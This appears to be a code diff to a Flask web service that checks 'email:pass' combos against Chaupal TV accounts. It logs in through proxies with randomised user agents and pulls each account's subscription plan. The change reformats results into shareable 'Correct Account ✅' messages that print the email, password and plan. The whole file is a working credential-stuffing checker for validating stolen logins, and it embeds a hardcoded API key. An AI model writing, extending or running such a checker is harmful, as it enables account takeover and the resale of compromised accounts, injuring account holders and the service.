@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, Response
 import requests
 import datetime
 import os
@@ -18,10 +18,30 @@ def proxy_dict(proxy_str):
 
 def ms_to_date(ms):
     try:
-        # Date only (no time)
         return datetime.datetime.utcfromtimestamp(int(ms)//1000).strftime("%Y-%m-%d")
     except:
         return ms
+
+def format_chaupal_result(email, password, email_verified, plan, created):
+    # Plan parsing
+    if isinstance(plan, dict) and plan.get("planMetadata"):
+        plan_name = plan.get("planMetadata", {}).get("name", "N/A").strip()
+        price = plan.get("price", {}).get("amount", "N/A")
+        currency = plan.get("price", {}).get("currency", "N/A")
+        interval = plan.get("price", {}).get("interval", "")
+        interval_multiplier = plan.get("price", {}).get("intervalMultiplier", "")
+        plan_str = f"{plan_name} ({price} {currency} / {interval_multiplier} {interval})"
+    else:
+        plan_str = "N/A"
+
+    return f"""𝐂𝐡𝐚𝐮𝐩𝐚𝐥 𝐂𝐨𝐫𝐫𝐞𝐜𝐭 𝐀𝐜𝐜𝐨𝐮𝐧𝐭  ✅
+
+𝗘𝗺𝗮𝗶𝗹 - {email}
+𝗣𝗮𝘀𝘀 - {password}
+𝗘𝗺𝗮𝗶𝗹 𝗩𝗲𝗿𝗶𝗳𝗶𝗲𝗱 - {"Yes" if email_verified else "No"}
+𝗣𝗹𝗮𝗻 - {plan_str}
+𝗖𝗿𝗲𝗮𝘁𝗲𝗱 - {created}
+"""
 
 @app.route('/chaupal_check', methods=['GET', 'POST'])
 def chaupal_check():
@@ -38,7 +58,7 @@ def chaupal_check():
 
     # Split email:pass
     if ':' not in email_combo:
-        return jsonify({"status": "error", "message": "Invalid email param format (use email:pass)"}), 400
+        return Response("Invalid email param format (use email:pass)", mimetype="text/plain"), 400
     email, password = email_combo.split(':', 1)
 
     # Step 1: Login
@@ -55,18 +75,16 @@ def chaupal_check():
         if login_resp.status_code != 200:
             try:
                 error = login_resp.json()
-                return jsonify({
-                    "status": "error",
-                    "message": error.get('error', {}).get('message', 'Unknown error')
-                })
+                message = error.get('error', {}).get('message', 'Unknown error')
+                return Response(f"❌ {email}:{password}\nReason: {message}", mimetype="text/plain")
             except:
-                return jsonify({"status": "error", "message": f"HTTP {login_resp.status_code}"})
+                return Response(f"❌ {email}:{password}\nReason: HTTP {login_resp.status_code}", mimetype="text/plain")
         data = login_resp.json()
         id_token = data.get("idToken")
         if not id_token:
-            return jsonify({"status": "error", "message": "No idToken in response!"})
+            return Response(f"❌ {email}:{password}\nReason: No idToken in response!", mimetype="text/plain")
     except Exception as e:
-        return jsonify({"status": "error", "message": f"Proxy/Login error: {str(e)}"})
+        return Response(f"❌ {email}:{password}\nReason: Proxy/Login error: {str(e)}", mimetype="text/plain")
 
     # Step 2: Get Account Info
     info_url = "https://identitytoolkit.googleapis.com/v1/accounts:lookup?key=AIzaSyCy9pm1PChZKOULywz9FBV1QD8MLZFc35c"
@@ -76,12 +94,12 @@ def chaupal_check():
             "User-Agent": ua.random
         })
         if info_resp.status_code != 200:
-            return jsonify({"status": "success", "message": "Login OK, failed to fetch info"})
+            return Response(f"✅ {email}:{password}\nReason: Login OK, failed to fetch info", mimetype="text/plain")
         acc_info = info_resp.json()
         users = acc_info.get("users", [])
         user = users[0] if users else {}
     except Exception as e:
-        return jsonify({"status": "success", "message": f"Login OK, info error: {str(e)}"})
+        return Response(f"✅ {email}:{password}\nReason: Login OK, info error: {str(e)}", mimetype="text/plain")
 
     # Step 3: Chaupal Plan Info
     plan_url = "https://content.chaupal.tv/payments/subscription"
@@ -102,17 +120,16 @@ def chaupal_check():
         else:
             plan_data = None
     except Exception as e:
-        plan_data = f"Plan API error: {str(e)}"
+        plan_data = None
 
-    resp = {
-        "status": "success",
-        "email": email,
-        "email_verified": user.get('emailVerified', False),
-        "created": ms_to_date(user.get('createdAt', 'N/A')),
-        "last_login": ms_to_date(user.get('lastLoginAt', 'N/A')),
-        "plan_info": plan_data,
-    }
-    return jsonify(resp)
+    formatted = format_chaupal_result(
+        email,
+        password,
+        user.get('emailVerified', False),
+        plan_data,
+        ms_to_date(user.get('createdAt', 'N/A'))
+    )
+    return Response(formatted, mimetype="text/plain")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8000)))
